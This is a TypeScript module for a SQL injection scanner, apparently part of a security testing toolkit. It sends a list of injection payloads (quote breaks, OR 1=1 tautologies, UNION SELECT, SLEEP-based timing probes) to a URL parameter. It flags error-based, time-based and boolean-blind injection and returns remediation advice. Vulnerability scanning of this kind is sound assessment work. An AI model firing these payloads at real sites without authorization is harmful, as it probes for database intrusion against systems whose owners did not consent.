import { performance } from 'node:perf_hooks';
import { logToolActivity } from '../utils/activityLogger.js';

export interface SQLiResult {
  url: string;
  parameter: string;
  vulnerable: boolean;
  injectionType?: 'error-based' | 'boolean-blind' | 'time-based';
  payloadUsed?: string;
  errorMessage?: string;
  dbType?: string;
  recommendations: string[];
  scanDuration: number;
}

const PAYLOADS = [
  "'",
  "''",
  "1' OR '1'='1",
  "1 AND 1=2",
  "1; SELECT SLEEP(3)--",
  "1' UNION SELECT NULL--",
  "1' AND SLEEP(3)--",
  "1 OR SLEEP(3)--",
  "' OR 1=1--",
  "admin'--",
];

const DB_ERROR_PATTERNS: Array<{ pattern: RegExp; dbType: string }> = [
  { pattern: /SQL syntax.*MySQL/i, dbType: 'MySQL' },
  { pattern: /Warning.*mysql_fetch/i, dbType: 'MySQL' },
  { pattern: /ORA-\d{5}/i, dbType: 'Oracle' },
  { pattern: /Microsoft OLE DB Provider for SQL Server/i, dbType: 'MSSQL' },
  { pattern: /Unclosed quotation mark/i, dbType: 'MSSQL' },
  { pattern: /PostgreSQL.*ERROR/i, dbType: 'PostgreSQL' },
  { pattern: /sqlite_/i, dbType: 'SQLite' },
  { pattern: /SQLITE_ERROR/i, dbType: 'SQLite' },
  { pattern: /Syntax error or access violation/i, dbType: 'Unknown SQL' },
  { pattern: /You have an error in your SQL syntax/i, dbType: 'MySQL' },
  { pattern: /supplied argument is not a valid MySQL/i, dbType: 'MySQL' },
  { pattern: /pg_exec\(\)/i, dbType: 'PostgreSQL' },
  { pattern: /mysql_num_rows\(\)/i, dbType: 'MySQL' },
];

async function fetchWithTimeout(
  url: string,
  options: RequestInit,
  timeoutMs: number
): Promise<{ status: number; body: string; responseTime: number }> {
  const start = performance.now();
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const response = await fetch(url, { ...options, signal: controller.signal });
    clearTimeout(timer);
    const body = await response.text();
    return { status: response.status, body, responseTime: Math.round(performance.now() - start) };
  } catch (err: any) {
    clearTimeout(timer);
    if (err.name === 'AbortError') {
      return { status: 0, body: '', responseTime: Math.round(performance.now() - start) };
    }
    throw err;
  }
}

function buildUrl(baseUrl: string, parameter: string, value: string): string {
  try {
    const u = new URL(baseUrl);
    u.searchParams.set(parameter, value);
    return u.toString();
  } catch {
    return `${baseUrl}?${encodeURIComponent(parameter)}=${encodeURIComponent(value)}`;
  }
}

export async function performSQLiTest(
  url: string,
  parameter: string,
  method: 'GET' | 'POST' = 'GET',
  timeoutMs: number = 10000
): Promise<SQLiResult> {
  const start = performance.now();
  logToolActivity('SQL Injection Tester', `Testing ${url} param: ${parameter}`, 'info');

  const recommendations = [
    'Use parameterized queries / prepared statements.',
    'Apply input validation and whitelist acceptable characters.',
    'Use an ORM or query builder instead of raw SQL concatenation.',
    'Implement a Web Application Firewall (WAF).',
    'Apply the principle of least privilege to database accounts.',
  ];

  // Baseline request with safe value
  let baseline;
  try {
    baseline = await fetchWithTimeout(
      method === 'GET' ? buildUrl(url, parameter, '1') : url,
      method === 'POST'
        ? { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `${encodeURIComponent(parameter)}=1` }
        : { method: 'GET' },
      timeoutMs
    );
  } catch (err: any) {
    logToolActivity('SQL Injection Tester', `Connection failed: ${err.message}`, 'warning');
    throw new Error(`Failed to connect to target: ${err.message}`);
  }

  // Test each payload
  for (const payload of PAYLOADS) {
    const isTimeBased = payload.toLowerCase().includes('sleep');
    const effectiveTimeout = isTimeBased ? Math.max(timeoutMs, 6000) : timeoutMs;

    let testResult;
    try {
      testResult = await fetchWithTimeout(
        method === 'GET' ? buildUrl(url, parameter, payload) : url,
        method === 'POST'
          ? { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `${encodeURIComponent(parameter)}=${encodeURIComponent(payload)}` }
          : { method: 'GET' },
        effectiveTimeout
      );
    } catch {
      continue;
    }

    // Check: error-based
    for (const { pattern, dbType } of DB_ERROR_PATTERNS) {
      if (pattern.test(testResult.body)) {
        logToolActivity('SQL Injection Tester', `SQL injection found (error-based) at ${url}`, 'success');
        return {
          url, parameter, vulnerable: true,
          injectionType: 'error-based',
          payloadUsed: payload,
          dbType,
          recommendations,
          scanDuration: Math.round((performance.now() - start) / 1000),
        };
      }
    }

    // Check: time-based (response took > 2.5s)
    if (isTimeBased && testResult.responseTime > 2500) {
      logToolActivity('SQL Injection Tester', `SQL injection found (time-based) at ${url}`, 'success');
      return {
        url, parameter, vulnerable: true,
        injectionType: 'time-based',
        payloadUsed: payload,
        recommendations,
        scanDuration: Math.round((performance.now() - start) / 1000),
      };
    }

    // Check: boolean blind (significant length difference)
    const lengthDiff = Math.abs(testResult.body.length - baseline.body.length);
    const relativeDiff = baseline.body.length > 0 ? lengthDiff / baseline.body.length : 0;
    if (relativeDiff > 0.2 && lengthDiff > 100 && !isTimeBased) {
      logToolActivity('SQL Injection Tester', `SQL injection found (boolean-blind) at ${url}`, 'success');
      return {
        url, parameter, vulnerable: true,
        injectionType: 'boolean-blind',
        payloadUsed: payload,
        recommendations,
        scanDuration: Math.round((performance.now() - start) / 1000),
      };
    }
  }

  logToolActivity('SQL Injection Tester', `No SQL injection detected at ${url}`, 'success');
  return {
    url, parameter, vulnerable: false,
    recommendations,
    scanDuration: Math.round((performance.now() - start) / 1000),
  };
}
